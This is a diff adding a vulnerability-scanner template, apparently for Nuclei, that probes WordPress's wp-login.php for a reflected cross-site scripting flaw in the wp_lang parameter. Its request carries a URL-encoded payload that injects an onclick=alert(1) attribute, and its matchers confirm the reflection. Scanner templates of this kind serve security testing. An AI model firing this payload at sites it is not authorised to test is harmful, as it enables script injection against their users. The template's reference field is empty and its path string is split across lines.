@@ -1,0 +1,34 @@
+id: wp-unauth-xss
+
+info:
+  name: wp-unauth-xss
+  author: H1NTR0X01
+  severity: medium
+  reference: 
+  metadata:
+    verified: "true"
+    shodan-query: title:""
+  tags: cve,cve2023,wp,xss
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-login.php?redirect_to={{BaseURL}}/about-us/wp-admin/&wp_lang=en_USucilg
+  %22%20accesskey%3dx%20onclick%3dalert(1)%2f%2fbrokendelta'
+
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '" accesskey=x onclick=alert(1)//brokendelta'
+          - 'USucilg'
+        condition: and
+      - type: word
+        part: header
+        words:
+          - text/html
+      - type: status
+        status:
+          - 200
